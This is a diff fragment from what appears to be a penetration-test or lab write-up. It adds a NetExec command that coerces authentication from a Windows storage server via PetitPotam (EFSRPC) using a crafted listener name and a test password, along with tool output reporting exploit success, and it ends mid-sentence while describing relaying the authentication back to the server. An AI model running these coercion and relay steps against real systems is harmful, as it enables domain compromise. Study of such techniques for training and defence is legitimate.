@@ -1002,5 +1002,23 @@ Impacket v0.14.0.dev0+20260805.100140.701354e9 - Copyright Fortra, LLC and its a
 Ill then set up ntlm relay to relay the authentication
 
 ```python
-
+nxc smb storage.novaforge.local -u ryan.collins -p 'Password123!' -M coerce_plus -o ALWAYS=true LISTENER=localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA
+SMB         10.0.0.101      445    STORAGE          [*] Windows 11 / Server 2025 Build 26100 x64 (name:STORAGE) (domain:novaforge.local) (signing:True) (SMBv1:None)
+SMB         10.0.0.101      445    STORAGE          [+] novaforge.local\ryan.collins:Password123! 
+COERCE_PLUS 10.0.0.101      445    STORAGE          VULNERABLE, PetitPotam
+COERCE_PLUS 10.0.0.101      445    STORAGE          Exploit Success, efsrpc\EfsRpcAddUsersToFile
+COERCE_PLUS 10.0.0.101      445    STORAGE          Exploit Success, efsrpc\EfsRpcAddUsersToFileEx
+COERCE_PLUS 10.0.0.101      445    STORAGE          Exploit Success, efsrpc\EfsRpcDecryptFileSrv
+COERCE_PLUS 10.0.0.101      445    STORAGE          Exploit Success, efsrpc\EfsRpcDuplicateEncryptionInfoFile
+COERCE_PLUS 10.0.0.101      445    STORAGE          Exploit Success, efsrpc\EfsRpcEncryptFileSrv
+COERCE_PLUS 10.0.0.101      445    STORAGE          Exploit Success, efsrpc\EfsRpcEncryptFileSrv
+COERCE_PLUS 10.0.0.101      445    STORAGE          Exploit Success, efsrpc\EfsRpcFileKeyInfo
+COERCE_PLUS 10.0.0.101      445    STORAGE          Exploit Success, efsrpc\EfsRpcQueryRecoveryAgents
+COERCE_PLUS 10.0.0.101      445    STORAGE          Exploit Success, efsrpc\EfsRpcQueryUsersOnFile
+COERCE_PLUS 10.0.0.101      445    STORAGE          Exploit Success, efsrpc\EfsRpcOpenFileRaw
+COERCE_PLUS 10.0.0.101      445    STORAGE          VULNERABLE, MSEven
 ```
+
+Then ill get the storage server to relay authentication back to itself
+
+> NOTE: for some reason nxc i
